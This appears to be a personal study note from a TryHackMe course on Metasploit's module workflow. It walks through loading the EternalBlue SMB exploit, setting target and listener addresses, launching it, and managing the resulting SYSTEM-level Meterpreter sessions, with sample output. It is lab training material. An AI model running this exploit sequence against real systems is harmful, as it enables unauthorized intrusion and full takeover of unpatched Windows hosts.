2025-06-14 12:50

Status:

Tags: [[Metasploit]] [[Cyber Security 101]] [[tryhackme]]
###### Prerequisites: [[Msfconsole]]


## 🔷 Metasploit Module Context & Workflow Guide

This guide walks you through Metasploit's module structure, commands, and common workflows using clear examples and tables.

---

## 1. Recognizing Shell Contexts

|Prompt Example|Context Description|
|---|---|
|`root@kali:~#`|Linux shell (outside Metasploit)|
|`msf6 >`|Metasploit console (no module loaded)|
|`msf6 exploit(...) >`|Inside a module (e.g., exploit, auxiliary)|
|`meterpreter >`|Meterpreter shell (on compromised system)|
|`C:\Windows\System32>`|Windows shell on target|

---

## 2. Setting Up and Using Modules

### Load a Module

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

### Set Required Parameters

```bash
set RHOSTS 10.10.165.39
set LHOST 10.10.44.70
set LPORT 4444
```

### View Current Options

```bash
show options
```

---

## 3. Common Module Parameters

|Parameter|Description|
|---|---|
|`RHOSTS`|Target IP address or range|
|`RPORT`|Remote port (default for SMB: 445)|
|`LHOST`|Attacker's local IP|
|`LPORT`|Local port to receive shell|
|`PAYLOAD`|Payload to use (e.g., reverse shell)|
|`SESSION`|Active session ID (used in post modules)|

---

## 4. Setting Global Parameters

Set a value for all modules:

```bash
setg RHOSTS 10.10.165.39
```

Unset a global value:

```bash
unsetg RHOSTS
```

Unset all values:

```bash
unset all
```

---

## 5. Switching Between Modules

Example: Use an auxiliary scanner after setting global RHOSTS.

```bash
use exploit/windows/smb/ms17_010_eternalblue
setg RHOSTS 10.10.165.39
back
use auxiliary/scanner/smb/smb_ms17_010
show options
```

---

## 6. Executing Modules

|Command|Description|
|---|---|
|`exploit`|Run exploit modules|
|`run`|Run auxiliary or post modules|
|`exploit -z`|Launch module and background session|

---

## 7. Sample Exploit Output

```bash
msf6 > exploit -z

[+] 10.10.165.39:445 - Host is likely VULNERABLE to MS17-010!
[*] Sending stage (200262 bytes) to 10.10.165.39
[*] Meterpreter session 1 opened (10.10.44.70:4444 -> 10.10.165.39:49186)
```

---

## 8. Session Management

### Background Current Session

```bash
background
```

Or use `CTRL + Z`.

### List Active Sessions

```bash
sessions
```

Example Output:

```
Id  Name  Type                     Information                   Connection
--  ----  ----                     -----------                   ----------
1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.165.39
```

---
